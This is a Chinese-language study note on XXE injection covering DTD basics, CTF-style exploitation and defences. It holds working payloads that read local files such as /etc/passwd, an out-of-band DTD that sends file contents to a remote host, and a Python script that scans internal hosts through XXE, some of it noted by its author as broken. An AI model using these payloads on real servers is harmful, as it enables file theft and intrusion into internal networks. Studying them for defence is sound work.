# XXE

[toc]

## 1 XXE是什么

普通的XML注入，就是利用用户输入，改变xml文档的结构，很辣鸡。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<USER role="guest">用户输入</USER>

<!--输入：user1</USER><USER role="admin">user2-->

<?xml version="1.0" encoding="UTF-8"?>
<USER role="guest">user1</USER>
<USER role="admin">user2</USER>
```

这能插入XML代码，危害有限，需要更大的危害，于是出现了XXE。

XXE叫XML外部实体注入，顾名思义，是一个关于**外部实体**的**注入**漏洞。

如果能注入，并且外部实体被成功解析的话，就会大大拓宽攻击面。

## 2 背景知识

XML是一种标记语言，与HTML不同的是，前者用来传输or解析数据，后者用来展示前端页面。XML主要用于配置文件、文档格式、图像格式和网络协议。

在解析外部实体的过程中，XML解析器可根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS、FTP、HTTP、SMB）等。外部实体对于在文档中创建动态引用非常有用。这样对任何资源所做的更改都会在文档中自动更新。

> ？？

但是，在处理外部实体时，可以针对应用程序启动很多攻击。包括：

- 泄漏本地文件内容
- 利用各种协议的网络访问功能来操纵内部应用

通过将这些攻击与其他实现缺陷结合，攻击范围甚至可以扩展到客户端内存损坏、任意代码执行，甚至服务中断。

## 3 基础知识

XML文档有自己的格式规范，称为DTD(Document Type Definition)。

可被成行地声明于 XML 文档中，也可作为一个外部引用。

两者的区别仅在于引用的方式不同。

> 就像JS文件可以内嵌，也可以引用外部的。

- 内部文档声明

假如 DTD 被包含在 XML 源文件中，应当通过下面的语法包装在一个 DOCTYPE 声明中

```xml-dtd
<!DOCTYPE root-element [element-declarations] >
```



```xml-dtd
<!DOCTYPE note
[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```

- 外部文档声明

  加入DTD位于XML源文件的外部，那么应该通过下面的语法被封状态一个DOCTYPE定义中

  引用方式

  ```xml-dtd
  <!DOCTYPE root-element SYSTEM "filename">
  ```

  然后看一个实例xml

  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE note SYSTEM "note.dtd">
  <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
  </note>
  ```

  接下来是`note.dtd`文件

  ```xml-dtd
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
  ```

  通过DTD，每一个XML文件均可携带一个有关自身格式的描述；

  通过DTD，独立的团队可一致的使用某个标准的 DTD 来交换数据。

  您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。

  可以使用 DTD 来验证您自身的数据。

  > 怎么验证or使用？场景呢？



除了能在DTD中定义元素(标签，比如`<root><root>`)，还能在其中定义实体(标签的值)。毕竟XML中除了要定义标签为，还需要某些内容固定。

> 类比python的字典， 元素-key；实体-value

```dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo[
<!ELEMENT foo ANY>
<!ENTITY xxe "test">]>
```

此处，定义元素为ANY，说明接受任何元素。也就是，不限定格式。不过重点在于，这里定义了一个xml实体。

实体可以看成一个变量，加上&就表示引用了实体。因此，xml就可写成这样

```xml
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

使用`&xxe`对上面定义的xxe实体进行了引用，输出时就会被`test`替换。

### 重点来了

#### 重点一

实体分为两种，内部实体和外部实体，上面举的例子是内部实体。但也可从外部的dtd文件中引用。

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo[
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "file://etc/passwd">
  ]
>
```

这样，对引用资源所做的任何更改，都会在文档中自动更新。

> 外部实体，类似变量的值，但不是直接定义的常量。

当然，还有一种引用方式是  引用公用DTD。

```dtd
<!DOCTYPE root-element PUBLIC "DTD ident" "publicDTD's URI"
```

这个在攻击中，也可以起到和SYSTEM一样的作用。

#### 重点二

上面将实体分为了两类：内部和外部实体；从另一角度看，也可分为通用和参数实体。

1. 通用实体

   用`&实体名;`来引用。在DTD中定义，在XML文档中使用。

   ```xml-dtd
   <?xml version="1.0" encoding="utf-8"?> 
   <!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///etc/passwd">] >
   <updateProfile>
   	<firstname></firstname>
   	<lastname>&file;</lastname>
   </updateProfile>
   
   ```

2. 参数实体

   - 定义：`% 实体名`在**DTD中**定义；引用：`%实体名;`在**DTD中**引用
   - 只有在DTD文件中，参数实体的声明才能引用其他实体
   - 和通用实体一样，也可引用外部实体

   ```dtd
   <!ENTITY % an-elem "<!ELEMENT mytag(subtag)>">
   <!ENTITY % remote-dtd SYSTEM "http:/ip/remote.dtd">
   %an-elem; %remote-dtd
   ```

   ps：参数实体在Blind XXE中很关键

## 4 能做什么

### 4.1 有回显读取本地文件(Normal XXE)

场景模拟：服务器能接受并解析XXE，并且有回显。

xml.php

```php
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;

?>
```

payload

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
<creds>&goodies;</creds>
```

结果：

![image-20191025165211139](1139.png)

**But**，如果有特殊符号，就会报错了。因为xml并不直接输出`< > & "`之类的字符，因为元素/实体也是用的这些。这时需要用到`CDATA`，他会把所有的数据当作数据的常量，而非标记/实体。

```dtd
<![CDATA[xxxx]
]>
```

所以，如果有特殊字符，只需要放在这个里面输出就行了。但是如何做到？肯定是把要输出的内容两边加上`<![CDATA[`和 `]]>`。

- ~~xml中直接，连续引用多个实体~~
- 借助参数实体

> 其实重点是，字符串拼接，要拼接好了再在xml中引用；而不能再xml中拼接；
>
> 作者这里用到了参数实体进行拼接，是因为参数实体在dtd中引用，通用实体在xml中引用。

Payload

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE root[
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % goodies SYSTEM "file:///etc/zshrc">
  	<!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://ip/evil.dtd">
    %dtd;
  ]
>

<root>&all</root>
```

evil.dtd

```dtd
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```

> 此处有问题，无法复现

### 4.2 无回显读取本地文件(Blind OOB XXE)

xml.php

```php
<?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>
```

payload

```dtd
<!DOCTYPE convert [ 
    <!ENTITY % remote SYSTEM "http://ip/test.dtd">
    %remote;%int;%send;
  ]
>
```

Test.dtd

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convet.base64-encode/resource=file:///etc/zshrc">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip?p=%file;'>">
```

> 内部，不能这样直接引用

### 思考

我们刚刚只是做了一件事，就是通过file协议读取本地文件，或者通过http协议发出请求。这就很类似SSRF了，因为他们都是从服务器向另一台服务器发起请求。那么如果我们将远程服务器的地址换成某个内网地址，是否也能实现SSRF？没错，XXE其实也是一种SSRF的攻击手法，因为SSRF知识一种攻击模式，利用这个模式，我们能使用很多协议及漏洞进行攻击。

> 这段还不太懂

### 4.3 HTTP内网主机探测

我们以存在XXE漏洞的服务器作为探测内网的支点。要进行内网探测，我们还需要准备一些工作，需要先利用file协议尝试读取支点服务器的网络配置文件，看下有没有内网，以及网段大概什么样子。可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host ，之后我们就有了大致的探测方向。

探测脚本实例：

```python
import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>

#<?xml version="1.0" encoding="ISO-8859-1"?>
#<!DOCTYPE foo [<!ELEMENT foo ANY>]
#<!ENTITY xxe SYSTEM php://filter/convert.base64-encode/resource=http://10.2.2.2/>]>
#	<stuff>&xxe</stuff>
#</xml>
# payload.xml
def build_xml(string):
  xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
  xml = xml+"\r\n"+ """<!DOCTYPE foo [<!ELEMENT foo ANY>]"""
  xml = xml+"\r\n"+ """<!ENTITY xxe SYSTEM""" + '"'+string+ '"' + ">]>"
  xml = xml+"\r\n"+ """		<stuff>&xxe</stuff>"""
  xml = xml+"\r\n"+ """</xml>"""
  send_xml(xml)
  
def send(xml):
  headers = {'Content-Type': 'application/xml'}
  x = requests.post('http://ip/xxe.php', data=xml, headers=headers, timeout=5).text
  # # a little split to get only the base64 encoded value
  coded_string = x.split(' ')[-2]
  print(coded_string)
  
  for i in range(1, 255):
    try:
      ip = '10.0.0.'+str(i)
      string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
      print(string)
      build_xml(string)
    except:
      continue

```

上述脚本，是向内网主机发送xml，利用xxe

> 为什么，这个resource会返回信息
>
> --- php文件包含

### 4.4 内网主机端口扫描

找到了一台内网主机，想知道攻击点在哪里，还需要进行端口扫描。端口扫描的脚本主机探测几乎没什么变化，只需要把ip固定，循环遍历端口即可。一般我们是通过响应长短来判断是否开放。除了这种，还可以结合burp进行端口探测。

比如我们传入：

```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
<!ELEMENT data (#PCDATA)>  
]>
<data>4</data>

```

返回结果

```
javax.xml.bind.UnmarshalException  
 - with linked exception:
[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
Exception Description: An error occurred unmarshalling the document  
Internal Exception: ████████████████████████: Connection refused

```

然后结合burp intruder进行爆破即可。

至此，我们已经有能力对整个网段进行全面的探测，并能得到内网服务器的一些信息。如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接getshell

### 4.5 内网盲注(CTF)

总体上来讲， 是利用XXE进行内网的SQL盲注。

首先在外网的一台ip为39.107.33.75:33899的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错。既然如此，尝试读取服务器上面的文件，我们先读配置文件。

```
/var/www/52dandan.cc/public_html/config.php

```

拿到第一部分flag

```php
<?php
define(BASEDIR, "/var/www/52dandan.club/");
define(FLAG_SIG, 1);
define(SECRETFILE,'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431');
....
?>

```

> 注意⚠️
>
> 这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php
>
> 压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");
>
> 解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");

然后我们考虑内网有没有东西，我们要读取

```
/proc/net/arp
/etc/host

```

找到内网的另一台服务器的 ip 地址 192.168.223.18.

拿到这个IP之后，就可以开始端口扫描了。

。。。

### 4.6 文件上传

上面说的都是合php相关的，但是实际很多都是java框架出现的XXE。Java中有一个协议`jar://`比较值得关注。

**jar://协议的格式**

```
jar:{url}!{path}

# 例子
jar:http://host/application.jar!/file/within/the/zip

```

jar能远程获取jar文件，然后将其中的内容进行解压等。

jar协议处理文件的过程：

1. 下载jar/zip文件到临时文件中
2. 提取出我们指定的文件
3. 删除临时文件

........

## 5 漏洞位置

上面bb了那么多，都只是对漏洞的理解，但是xxe会出现在什么地方？

问题其实就出现在API接口能解析客户端传过来的xml代码，并且能引用外部实体。

> 但是还是没有说位置啊！怎么找这个API接口？！

就是找传输数据的地方，并且能解析XML。

> 我认为的特点
>
> - POST请求
> - 携带的数据本身就是xml /  or是json，但是也可以解析xml

## 6 XXE防御

> 所谓外部实体，我理解就是用户定义的实体

- 禁用外部实体
  php

  ```php
  libxml_disable_entity_loader(true);
  
  ```

  java

  ```java
  DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
  dbf.setExpandEntityReferences(false);
  
  .setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
  
  .setFeature("http://xml.org/sax/features/external-general-entities",false)
  
  .setFeature("http://xml.org/sax/features/external-parameter-entities",false);
  
  ```

  python

  ```python
  from lxml import etree
  xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
  
  ```

- 手动黑名单过滤(不推荐)

  过滤关键词

  ```
  <!DOCTYPE、<!ENTITY SYSTEM、PUBLIC
  
  ```

  

## 题外话：dtd的简介

dtd-----定义文档的结构



可被成行地声明于 XML 文档中，也可作为一个外部引用。

两者的区别仅在于引用的方式不同。

> 就像JS文件可以内嵌，也可以引用外部的。

- 内部文档声明

假如 DTD 被包含在 XML 源文件中，应当通过下面的语法包装在一个 DOCTYPE 声明中

```xml-dtd
<!DOCTYPE root-element [element-declarations] >

```



```xml-dtd
<!DOCTYPE note
[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>

```

- 外部文档声明

  加入DTD位于XML源文件的外部，那么应该通过下面的语法被封状态一个DOCTYPE定义中

  ```xml-dtd
  <!DOCTYPE root-element SYSTEM "filename">
  
  ```

  然后看一个实例xml

  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE note SYSTEM "note.dtd">
  <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
  </note>
  
  ```

  接下来是`note.dtd`文件

  ```xml-dtd
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
  
  ```

  通过DTD，每一个XML文件均可携带一个有关自身格式的描述；

  通过DTD，独立的团队可一致的使用某个标准的 DTD 来交换数据。

  您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。

  可以使用 DTD 来验证您自身的数据。

  > 怎么验证or使用？场景呢？



XXE可能存在的场景

